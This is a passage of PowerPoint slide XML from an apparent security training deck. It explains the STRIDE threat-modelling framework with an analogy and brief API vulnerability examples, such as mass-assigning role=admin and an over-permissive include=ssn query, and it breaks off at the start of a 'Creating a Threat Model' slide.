              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>The STRIDE Framework</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB593487-0E27-B3E6-8D05-B519AE157796}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7222359" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>STRIDE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is a fast, memorable acronym, designed to stress-test designs before code ships.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>It gives you six “ways things go wrong,” which we systematically apply to components and data flows so we can add the right controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2971051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C548C-569E-8C8D-7891-399A357D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D3418-A3FF-82D5-E9F3-8B2C29C0EBE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>The STRIDE Acronym</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4AED5D27-3EBA-33FB-3E0E-0218723BA9CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7283669" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>poofing – pretending to be someone/something else</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ampering – changing data or code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>epudiation – denying actions without evidence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>nformation Disclosure – exposing data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>enial of Service – making the system unavailable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>levation of Privilege – gaining permissions not intended</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25410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5D9A0-1C66-7272-A2B5-B0ABE7E78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C6656-F3A5-C057-0746-F72C9ABCA33A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>STRIDE Analogy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{859E6226-3010-E068-9EBA-A8893E42546C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8816427" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Picture your API platform as a parcel network:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Spoofing:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> an imposter driver shows a fake badge to pick up parcels.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Tampering:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> someone swaps items inside a sealed box </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> route.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Repudiation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> a courier claims they never scanned a pickup.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Info disclosure:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> labels reveal recipient SSNs (!).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>DoS:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> a flood of bogus pickup requests blocks real ones.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>EoP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> a warehouse picker walks into the “managers-only” cage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2964011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8B33E-CE42-FB38-715B-74FCDE888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F15D8-7D50-23F2-71BD-3B6527DB7E36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Common STRIDE Examples in Code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87101261-A8D8-7CDC-8488-B9B745EF68FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8816427" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Spoofing - Reused bearer token lets attacker call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/me</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> as someone else</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Tampering - Client changes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>price</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> field on checkout payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Repudiation - Logs miss </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>sub</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (user id) and correlation ids</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Information Disclosure - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>users?include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ssn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> works if you know the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>paramater</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Denial of service - No rate limits → bot floods checkout/API</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Elevation of privilege - User can set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>role=admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> on profile update</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23096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F49D-2A8A-0334-D8C6-35951E6A7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A7695-674A-CB3B-61DB-2433DEDB6632}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A165A873-CCCF-AD8B-4CD6-B7C5313B0FF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8816427" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
